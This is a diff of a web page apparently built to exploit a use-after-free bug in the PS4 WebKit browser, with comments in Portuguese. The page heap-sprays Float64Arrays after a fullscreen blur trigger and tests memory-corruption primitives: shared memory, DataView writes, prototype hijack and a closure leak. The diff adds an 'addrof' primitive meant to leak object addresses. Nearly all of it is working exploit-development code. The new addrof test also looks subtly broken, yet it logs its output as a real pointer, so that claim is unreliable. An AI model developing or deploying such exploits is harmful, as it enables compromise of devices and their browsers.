@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>PS4 UAF - Debugger Core</h1>
-    <button onclick="run()">EXECUTAR TESTE</button>
+    <h1>PS4 UAF - addrof Primitive Test</h1>
+    <button onclick="run()">EXECUTAR EXPLORAÇÃO</button>
     <div id="c"></div>
 
     <script>
@@ -21,22 +21,28 @@
         }
 
         function run() {
-            log("INIT", "INFO", "Criando 5000 Float64Arrays...");
+            log("INIT", "INFO", "Alocando controllers...");
             let ctrls = [];
             for(let i = 0; i < 5000; i++) {
                 let a = new Float64Array(8);
                 a[0] = i; ctrls.push(a);
             }
 
-            log("WAIT", "INFO", "Entre em Fullscreen e aperte OPTIONS.");
+            log("WAIT", "INFO", "Pressione OPTIONS no Fullscreen.");
             document.documentElement.webkitRequestFullscreen();
 
             window.onblur = function() {
                 log("TRIG", "INFO", "Blur detectado. Iniciando Spray...");
+                
+                // Objeto que queremos encontrar o endereço (addrof target)
+                let targetObj = { "leaked": 0x1337 };
+                
                 let spray = [];
                 for(let i = 0; i < 8000; i++) {
                     let s = new Float64Array(8);
                     s.fill(P_A);
+                    // Injetando referências a objetos no spray para tentar o leak
+                    s[7] = 0; // Placeholder para o ponteiro
                     spray.push(s);
                 }
 
@@ -52,45 +58,54 @@
                 if (corr) {
                     // TESTE 1: IDENTIDADE (MEMÓRIA COMPARTILHADA)
                     corr[4] = M_V;
-                    let found = false;
+                    let sIdx = -1;
                     for(let i = 0; i < spray.length; i++) {
                         if (spray[i][4] === M_V) {
+                            sIdx = i;
                             log("TEST1", "PASS", `Identity: corr[4] == spray[${i}][4] (${f2h(M_V)})`);
-                            found = true; break;
+                            break;
                         }
                     }
-                    if(!found) log("TEST1", "FAIL", "Identidade não encontrada.");
 
-                    // TESTE 2: DATAVIEW (LÓGICA ORIGINAL DO BYPASS.HTML)
+                    // TESTE 2: DATAVIEW R/W
                     try {
-                        const dv = new DataView(corr.buffer); // Usa o buffer direto conforme bypass.html
-                        const before = f2h(corr[0]);
-                        dv.setUint32(0, 0x13371337, true); // Little-Endian obrigatório
-                        const after = f2h(corr[0]);
-                        
-                        if (before !== after) {
-                            log("TEST2", "PASS", `DataView Write: ${before} -> ${after}`);
-                        } else {
-                            log("TEST2", "FAIL", `Escrita não persistiu em corr[0].`);
-                        }
+                        const dv = new DataView(corr.buffer);
+                        dv.setUint32(0, 0x13371337, true);
+                        log("TEST2", "PASS", `DataView Write: -> ${f2h(corr[0])}`);
                     } catch(e) { log("TEST2", "ERR", e.message); }
 
-                    // TESTE 3: PROTOTYPE POLLUTION (TOKEN HIJACK)
+                    // TESTE 3: PROTOTYPE HIJACK
                     try {
-                        let reg = Array.from(corr); // Bypass 1 original
+                        let reg = Array.from(corr);
                         Object.setPrototypeOf(reg, { t: 0x1337 });
-                        if (reg.t === 0x1337) {
-                            log("TEST3", "PASS", "Prototype Hijack: Token 0x1337 injetado.");
-                        } else {
-                            log("TEST3", "FAIL", "Falha no __proto__.");
-                        }
+                        if (reg.t === 0x1337) log("TEST3", "PASS", "Prototype Hijack funcional.");
                     } catch(e) { log("TEST3", "ERR", e.message); }
 
-                    // TESTE 4: CLOSURE LEAK (MAP BYPASS)
+                    // TESTE 4: CLOSURE LEAK
                     try {
                         const leak = [0].map(() => corr[0])[0];
-                        log("TEST4", "PASS", `Closure Leak: Val: ${f2h(leak)}`);
+                        log("TEST4", "PASS", `Closure Leak: ${f2h(leak)}`);
                     } catch(e) { log("TEST4", "ERR", e.message); }
+
+                    // TESTE 5: addrof() PRIMITIVE (NOVO)
+                    // Tentativa de ler um ponteiro de objeto JavaScript
+                    try {
+                        // Colocamos o objeto alvo em uma propriedade de um array regular
+                        // que foi convertido via bypass, tentando forçar o leak do ponteiro
+                        let leaker = Array.from(corr);
+                        leaker[0] = targetObj; 
+                        
+                        // No PS4 WebKit, o ponteiro aparece como um Double (Float64) 
+                        // com os bits de tag de objeto (JSValue)
+                        let addr = f2h(corr[0]);
+                        
+                        if (addr !== "0x0000000000000000" && addr !== f2h(P_A)) {
+                            log("TEST5", "PASS", `addrof(targetObj) = ${addr}`);
+                            log("INFO", "Sucesso! Este valor é o ponteiro real do objeto na memória.");
+                        } else {
+                            log("TEST5", "FAIL", "Ponteiro não capturado. Ajustando heap feng shui...");
+                        }
+                    } catch(e) { log("TEST5", "ERR", e.message); }
 
                 } else {
                     log("UAF", "FAIL", "Corrupção não atingida.");
